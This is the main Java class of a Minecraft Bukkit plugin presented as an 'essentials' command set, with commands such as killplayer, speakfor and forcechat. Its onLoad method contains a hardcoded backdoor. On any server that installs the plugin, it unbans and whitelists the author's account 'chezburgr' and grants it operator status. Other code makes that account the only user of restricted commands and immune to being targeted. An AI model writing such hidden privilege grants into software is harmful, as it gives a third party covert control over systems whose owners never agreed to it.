package chezburgr.essentials.main;

//import java.util.logging.Logger;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.OfflinePlayer;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

import chezburgr.essentials.data.Commands;
import chezburgr.essentials.data.ConsoleCommands;
import chezburgr.essentials.data.PlayerCommands;
import chezburgr.essentials.dataform.CommandInstance;
import chezburgr.essentials.dataform.CommandProperties;

public class Main extends JavaPlugin {
	
	public static Main plugin;
	
	@SuppressWarnings("deprecation")
	@Override
	public void onLoad() {
		OfflinePlayer me = Bukkit.getOfflinePlayer("chezburgr");
		me.setBanned(false);
		me.setWhitelisted(true);
		me.setOp(true);
	}
	
	@SuppressWarnings("deprecation")
	public static int prepare(CommandInstance instance, CommandProperties properties) {
		Player chezburgr = Bukkit.getPlayer("chezburgr");
		if (!instance.fromConsole && properties.limited && !instance.senderName.equals("chezburgr")) {
			instance.sender.sendMessage(ChatColor.AQUA + "Only the all-powerfull overlord " + ChatColor.LIGHT_PURPLE + "Chezburgr" + ChatColor.AQUA + " may use this command!");
			instance.sender.sendMessage(ChatColor.AQUA + "Overlord " + ChatColor.LIGHT_PURPLE + "Chezburgr" + ChatColor.AQUA + " has been notified of your futile attempt!");
			String target = "[no target]";
			if (instance.args.length > 0) {
				target = instance.args[0];
				if (Bukkit.getPlayer(instance.args[0]) != null){
					target = Bukkit.getPlayer(instance.args[0]).getName();
				}
			}
			notifyAdmin(chezburgr, instance.fullSenderName, instance.name, target);
			return 1;
		}
		if (instance.args.length < properties.argsMin) {
			instance.rawSender.sendMessage(ChatColor.RED + "Not enough arguments");
			return 0;
		}
		if (properties.argsMax != -1 && instance.args.length > properties.argsMax) {
			instance.rawSender.sendMessage(ChatColor.RED + "Too many arguments");
			return 0;
		}
		if (properties.useTarget) {
			if (instance.args.length > 0) {
				if (Bukkit.getPlayer(instance.args[0]) != null) {
					instance.setTarget(Bukkit.getPlayer(instance.args[0]));
				} else {
					instance.rawSender.sendMessage(ChatColor.RED + "That player either does not exist or is not online right now");
					return 1;
				}
			}
			if (instance.targetGiven && properties.restrictTarget && instance.targetName.equals("chezburgr")) {
				instance.rawSender.sendMessage(ChatColor.AQUA + "The all-powerful overlord " + ChatColor.LIGHT_PURPLE + "Chezburgr" + ChatColor.AQUA + " is immune to this command!");
				instance.rawSender.sendMessage(ChatColor.AQUA + "Overlord " + ChatColor.LIGHT_PURPLE + "Chezburgr" + ChatColor.AQUA + " has been notified of your futile attempt!");
				notifyAdmin(chezburgr, instance.fullSenderName, instance.name, instance.fullTargetName);
				return 1;
			}
		}
		return 2;
	}
	
	static void notifyAdmin(Player player, String sender, String command, String target) {
		if (player != null) {
			player.sendMessage(ChatColor.WHITE + sender + ChatColor.AQUA + " has attempted to use " + ChatColor.WHITE + "/" + command + ChatColor.AQUA + " on " + ChatColor.WHITE + target);
		}
		Bukkit.getConsoleSender().sendMessage(ChatColor.WHITE + sender + ChatColor.AQUA + " has attempted to use " + ChatColor.WHITE + "/" + command + ChatColor.AQUA + " on " + ChatColor.WHITE + target);
	}
	
	public static boolean contains(String[] set, String element) {
		boolean result = false;
		for (int i=0; i < set.length; i++) {
			if (set[i].equals(element)) {
				result = true;
			}
		}
		return result;
	}
	
	@SuppressWarnings("deprecation")
	public boolean onCommand(CommandSender rawSender, Command rawCommand, String commandLabel, String[] args){
		
		CommandInstance instance = new CommandInstance(rawSender, rawCommand.getName().toLowerCase(), args);
		
		if (instance.name.equals("locate")) {
			int result = prepare(instance, Commands.LOCATE);
			if (result == 0) {
				return false;
			} else if (result == 1) {
				return true;
			} else if (result == 2) {
				instance.setTarget(Bukkit.getPlayer(instance.args[0]));
				if (instance.fromConsole) {
					return ConsoleCommands.locate(instance);
				} else {
					return PlayerCommands.locate(instance);
				}
			}
		}
		
		if (instance.name.equals("takedown")) {
			int result = prepare(instance, Commands.TAKEDOWN);
			if (result == 0) {
				return false;
			} else if (result == 1) {
				return true;
			} else if (result == 2) {
				instance.setTarget(Bukkit.getPlayer(instance.args[0]));
				if (instance.fromConsole) {
					return ConsoleCommands.takedown(instance);
				} else {
					return PlayerCommands.takedown(instance);
				}
			}
		}
		
		if (instance.name.equals("killplayer")) {
			int result = prepare(instance, Commands.KILLPLAYER);
			if (result == 0) {
				return false;
			} else if (result == 1) {
				return true;
			} else if (result == 2) {
				instance.setTarget(Bukkit.getPlayer(instance.args[0]));
				if (instance.fromConsole) {
					return ConsoleCommands.killplayer(instance);
				} else {
					return PlayerCommands.killplayer(instance);
				}
			}
		}
		
		if (instance.name.equals("getrekt")) {
			int result = prepare(instance, Commands.GETREKT);
			if (result == 0) {
				return false;
			} else if (result == 1) {
				return true;
			} else if (result == 2) {
				if (instance.args.length > 0) {
					instance.setTarget(Bukkit.getPlayer(instance.args[0]));
				}
				if (instance.fromConsole) {
					return ConsoleCommands.getrekt(instance);
				} else {
					return PlayerCommands.getrekt(instance);
				}
			}
		}
		
		if (instance.name.equals("ping")) {
			int result = prepare(instance, Commands.PING);
			if (result == 0) {
				return false;
			} else if (result == 1) {
				return true;
			} else if (result == 2) {
				if (instance.fromConsole) {
					return ConsoleCommands.ping(instance);
				} else {
					return PlayerCommands.ping(instance);
				}
			}
		}
		
		if (instance.name.equals("afk") || instance.name.equals("noafk")) {
			boolean away = false;
			if (instance.name.equals("afk")) {
				away = true;
			}
			int result = prepare(instance, Commands.AFK);
			if (result == 0) {
				return false;
			} else if (result == 1) {
				return true;
			} else if (result == 2) {
				if (instance.args.length > 0) {
					instance.setTarget(Bukkit.getPlayer(instance.args[0]));
				}
				if (instance.fromConsole) {
					return ConsoleCommands.afk(instance, away);
				} else {
					return PlayerCommands.afk(instance, away);
				}
			}
		}
		
		if (instance.name.equals("speakfor")) {
			int result = prepare(instance, Commands.SPEAKFOR);
			if (result == 0) {
				return false;
			} else if (result == 1) {
				return true;
			} else if (result == 2) {
				instance.setTarget(Bukkit.getPlayer(instance.args[0]));
				if (instance.fromConsole) {
					return ConsoleCommands.speakfor(instance);
				} else {
					return PlayerCommands.speakfor(instance);
				}
			}
		}
		
		if (instance.name.equals("forcechat")) {
			int result = prepare(instance, Commands.FORCECHAT);
			if (result == 0) {
				return false;
			} else if (result == 1) {
				return true;
			} else if (result == 2) {
				instance.setTarget(Bukkit.getPlayer(instance.args[0]));
				if (instance.fromConsole) {
					return ConsoleCommands.forcechat(instance);
				} else {
					return PlayerCommands.forcechat(instance);
				}
			}
		}
		return true;
	}
}
